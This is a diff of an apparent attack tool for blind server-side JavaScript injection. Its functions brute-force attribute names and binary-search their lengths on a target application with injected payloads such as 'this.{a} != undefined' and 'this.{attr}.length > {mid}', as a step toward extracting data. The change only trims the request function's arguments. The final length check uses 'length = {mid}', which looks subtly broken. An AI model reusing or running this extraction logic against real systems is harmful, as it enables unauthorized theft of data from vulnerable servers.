@@ -30,7 +30,7 @@ def SSJI_brute_attribute_names(attack_target, extraction_point):
     found_attributes = []    
     for a in attributes_list:       
         extraction_payload = f'this.{a} != undefined'        
-        if send_extraction_request(attack_target, extraction_point, extraction_payload, attack_target.scan_param_name, attack_target.baseline_response):            
+        if send_extraction_request(attack_target, extraction_point, extraction_payload):            
             attr_length = SSJI_get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
             if attr_length:
                 found_attributes.append([a,attr_length])
@@ -46,19 +46,19 @@ def SSJI_get_extraction_parameter_length(attack_target,insertion_param_name, def
         
         # test if length is bigger than mid
         extraction_payload = f'this.{extraction_attribute_name}.length > {mid}'    
-        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):
+        if send_extraction_request(attack_target, extraction_point, extraction_payload):
             low = mid + 1 
             continue
         
         # test if length is smaller than mid
         extraction_payload = f'this.{extraction_attribute_name}.length < {mid}'    
-        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):
+        if send_extraction_request(attack_target, extraction_point, extraction_payload):
             high = mid - 1
             continue
         
         # length should be found
         extraction_payload = f'this.{extraction_attribute_name}.length = {mid}'    
-        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):                          
+        if send_extraction_request(attack_target, extraction_point, extraction_payload):                          
             return mid  
 
 def SSJI_brute_extract_data(attack_target, extraction_point, extraction_attribute_name, extraction_attribute_length):
